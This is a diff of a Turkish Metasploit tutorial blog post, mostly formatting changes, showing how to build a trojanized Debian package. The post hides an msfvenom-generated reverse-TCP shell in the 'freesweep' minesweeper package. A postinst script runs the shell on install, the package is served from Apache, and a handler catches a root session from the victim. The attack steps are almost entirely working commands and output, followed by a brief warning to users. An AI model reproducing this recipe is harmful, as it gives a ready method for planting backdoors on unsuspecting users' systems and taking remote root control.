@@ -1,41 +1,29 @@
 ---
 draft: false
-
-title:  'MSF Binary Linux Trojan'
-date: '2017-05-20T13:12:00+03:00'
+title: MSF Binary Linux Trojan
+linkTitle: MSF Binary Linux Trojan
+translationKey: msf-binary-linux-trojan
+weight: 210
+date: 2017-05-20T13:12:00+03:00
 author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
-
-description:  "İstemci taraflı saldırılara örnek olarak bir önceki yazımızda Windows platformu için\_.exe\_uzantılı bir çalıştırılabilir dosya oluşturmuştuk. Linux işletim sistemlerinin kullandığı tıkla ve çalıştır dosya tiplerinde de dosya oluşturabiliriz. Bu yazıda,\_.deb\_uzantılı bir dosya oluşturacağız." 
- 
-url:  /tr/msf-binary-linux-trojan/
- 
+description: Linux işletim sistemlerinin kullandığı tıkla ve çalıştır dosya tiplerinde trojan dosya oluşturabiliriz.
+url: /tr/msf-binary-linux-trojan/
 featured_image: /images/metasploit.jpg
 categories:
-    - 'Metasploit Framework'
+    - Metasploit Framework
 tags:
     - cybersecurity
-    - 'metasploit framework'
+    - metasploit framework
 ---
-
-
 İstemci taraflı saldırılara örnek olarak bir önceki yazımızda Windows platformu için `.exe` uzantılı bir çalıştırılabilir dosya oluşturmuştuk. Linux işletim sistemlerinin kullandığı tıkla ve çalıştır dosya tiplerinde de dosya oluşturabiliriz. Bu yazıda, `.deb` uzantılı bir dosya oluşturacağız.
-
-
 
 Ubuntu işletim sistemini hedef alan bu dosyanın oluşturulması ilk olarak biraz karışık gelebilir ancak adımları teker teker inceleyerek devam ederseniz kavramak daha kolay olacaktır.
 
-
-
 Öncelikle, içine payload yerleştireceğimiz bir programa ihtiyacımız var. Örnek olarak “Mine Sweeper” programını kullanalım.
-
-
 
 ## Paketi indirelim
 
-
-
 Paketi `--download-only` parametresiyle indirdiğimizde, işletim sistemimize kurulmayacaktır. Daha sonra indirdiğimiz paketi üzerinde çalışmak üzere oluşturacağımız `/tmp/evil` klasörüne taşıyacağız.
-
 
 ```bash
 root@kali:~# apt-get --download-only install freesweep
@@ -49,36 +37,22 @@ root@kali:~# cd /tmp/evil/
 root@kali:/tmp/evil#
 ```
 
-
-
 Artık `/tmp/evil` klasörünün içerisinde `freesweep_0.90-1_i386.deb` isimli bir Debian paketimiz var. İndirdiğiniz .deb uzantılı dosyanın ismi ve sürüm numarası farklı olabilir. İsmini `ls` komutuyla kontrol ederek örneklerdeki komutlara o şekilde uygulamalısınız.
-
-
 
 ## Paketi Açalım
 
-
-
 Şimdi bu `.deb` uzantılı paketi, sıkıştırılmış bir dosyayı açmaya benzer şekilde açmamız gerekiyor. Bu paketi aşağıdaki komutla `/tmp/evil` klasörü içinde `work` klasörüne çıkartıyoruz. Ardından, bizim ilave edeceğimiz özelliklerin bulunacağı `DEBIAN` isimli bir klasörü `/tmp/evil/work` klasörü altına oluşturuyoruz.
-
 
 ```bash
 root@kali:/tmp/evil# dpkg -x freesweep_0.90-1_i386.deb work
 root@kali:/tmp/evil# mkdir work/DEBIAN
 ```
 
-
-
 ## control Dosyası oluşturalım
-
-
 
 Debian klasörünün içerisinde `control` isimli bir dosya oluşturup içerisine aşağıdaki Metni yapıştırıp kaydediyoruz. Dosya içeriği aşağıdaki gibi `cat control` komutuyla kontrol ediyoruz.
 
-
-
 **control** dosyası içeriği
-
 
 ```bash
 Package: freesweep
@@ -95,18 +69,11 @@ Description: a text-based minesweeper
  **most text-based terminals currently **in **use.
 ```
 
-
-
 ## postinst dosyası oluşturalım
-
-
 
 Kurulum sonrası çalışması için ayrıca bir bash script dosyasına daha ihtiyacımız var. Yine yukarıdaki gibi `DEBIAN` klasörü içine `postinst` isimli bir dosya oluşturuyoruz. İçerisine aşağıdaki kod satırlarını yapıştırıyoruz.
 
-
-
 **postinst** dosya içeriği
-
 
 ```bash
 #!/bin/sh
@@ -114,33 +81,23 @@ Kurulum sonrası çalışması için ayrıca bir bash script dosyasına daha iht
 sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores &amp; /usr/games/freesweep &amp;
 ```
 
-
-
 ## Payload Oluşturalım
-
-
 
 Şimdi içerisinde zararlı kodların olduğu dosyayı oluşturabiliriz. Bunun için aşağıdaki komutu kullanarak `linux/x86/shell/reverse_tcp` payload modülünü kullanacağız. Komut içerisinde `LHOST` ve `LPORT` olarak verdiğimiz değişkenleri kendiniz belirleyebilirsiniz.
 
-
 ```bash
-root@kali:~# msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST**=**192.168.1.101 LPORT**=**443 -b "\x00" -f elf -o /tmp/evil/work/usr/games/freesweep_scores
+root@kali:~# msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=192.168.1.101 LPORT=443 -b "\x00" -f elf -o /tmp/evil/work/usr/games/freesweep_scores
 Found 10 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
-x86/shikata_ga_nai succeeded with size 98 (iteration**=**0)
+x86/shikata_ga_nai succeeded with size 98 (iteration=0)
 x86/shikata_ga_nai chosen with final size 98
 Payload size: 98 bytes
 Saved as: /tmp/evil/work/usr/games/freesweep_scores
 ```
 
-
-
 ## Yeniden paketleme
 
-
-
 Artık, `postinst` dosyamızı çalıştırılabilir hale getirip `.deb` paketini derleyebiliriz. Komut sonucunda oluşturulacak `work.deb` paketinin ismini `freesweep.deb` olarak değiştirip Apache Server klasörüne (`/var/www` veya `/var/www/html`) yükleyebiliriz. Artık dosyamız Web sunucuda indirilebilir durumdadır.
-
 
 ```bash
 root@kali:/tmp/evil/work/DEBIAN# chmod 755 postinst
@@ -150,14 +107,9 @@ root@kali:/tmp/evil# mv work.deb freesweep.deb
 root@kali:/tmp/evil# cp freesweep.deb /var/www/
 ```
 
-
-
 ## Dinleyici Handler Oluşturma
 
-
-
 Şimdi, bir tıklama veya çalıştırma ile gelecek bağlantı isteklerini dinlemek için dinleyici oluşturalım. Burada komuta vereceğimiz `LHOST` ve `LPORT` değerleri, payload oluştururken girilen değerler ile aynı olmalıdır.
-
 
 ```bash
 root@kali:~# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST 192.168.1.101; set LPORT 443; run; exit -y"
@@ -168,14 +120,9 @@ LPORT => 443
 > Starting the payload handler...
 ```
 
-
-
 ## Sonuç
 
-
-
 Herhangi bir kullanıcı, bu hazırladığımız `freesweep.deb` paketini indirip çalıştırdığında dinleme yapan `exploit/multi/handler` modülümüz hedef bilgisayarda oturum açacaktır.
-
 
 ```bash
 ubuntu@ubuntu:~$ wget <a href="http://192.168.1.101/freesweep.deb">http://192.168.1.101/freesweep.deb</a>
@@ -198,13 +145,9 @@ Interrupt:17 Base address:0x1400
 hostname
 ubuntu
 id
-uid**=**0(root) gid**=**0(root) groups**=**0(root)
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
-
-
 ## Tavsiye
-
-
 
 Görüldüğü gibi zararlı yazılımlar sadece Windows’a özel değildir. Linux kullanıcılarının da tıkla ve çalıştır programlara dikkatle yaklaşması gerekmektedir. Güvenilir olmayan kaynaklardan paket yüklememenizi tavsiye ediyoruz.
